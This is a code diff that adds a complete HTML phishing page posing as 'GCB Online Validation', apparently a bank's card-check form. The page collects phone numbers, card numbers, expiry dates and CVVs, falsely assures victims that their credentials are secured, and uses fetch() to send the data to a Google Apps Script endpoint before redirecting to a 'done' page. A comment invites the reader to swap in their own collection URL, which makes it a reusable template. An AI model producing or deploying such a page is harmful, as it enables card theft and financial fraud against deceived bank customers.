@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GCB ONLINE VALIDATION</title>
+
+  <style>
+    body {               
+      font-family: Arial, sans-serif;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      width: 320px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+
+    h3 {
+      text-align: center;
+      color: gold;
+      margin-bottom: 5px;
+      text-transform: uppercase;
+    }
+
+    .subheading {
+      text-align: center;
+      font-size: 12px;
+      color: grey;
+      margin-bottom: 15px;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+    }
+
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      background: #ffffff;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 10px;
+      background: grey;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #555;
+    }
+
+    .msg {
+      margin-top: 10px;
+      color: green;
+      text-align: center;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 10px;
+      color: grey;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="box">
+  <h3>GCB ONLINE VALIDATION</h3>
+  <div class="subheading">GCB, YOUR BANK FOR LIFE.</div>
+
+  <form id="form">
+    <label>Phone Number</label>
+    <input type="text" id="phone" required>
+
+    <label>Card Number</label>
+    <input type="text" id="card" required>
+
+    <label>Expiry Date</label>
+    <input type="month" id="expiry" required>
+
+    <label>CVV</label>
+    <input type="password" id="cvv" required>
+
+    <button type="submit">Validate</button>
+  </form>
+
+  <div class="msg" id="msg"></div>
+
+  <footer>Your credentials are secured</footer>
+</div>
+
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbzRpGxHpUbgRM4aQK3AqLC5wRO8sFBR9-ZKKbieu2ps480EtcFffIuOhH3mYWqk6i6T8Q/exec"; // <-- Replace with your Apps Script /exec URL
+  const form = document.getElementById("form");
+  const msg = document.getElementById("msg");
+
+  form.addEventListener("submit", e => {
+    e.preventDefault();
+
+    const formData = new FormData();
+    formData.append("phone", document.getElementById("phone").value);
+    formData.append("card", document.getElementById("card").value);
+    formData.append("expiry", document.getElementById("expiry").value);
+    formData.append("cvv", document.getElementById("cvv").value);
+
+    fetch(scriptURL, {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.text()) // Apps Script prefers text
+    .then(() => {
+      // Redirect to the done page after successful submission
+      window.location.href = "done.html";
+    })
+    .catch(err => {
+      console.error(err);
+      msg.textContent = "❗ Failed to connect to server";
+    });
+  });
+</script>
+
+</body>
+</html>
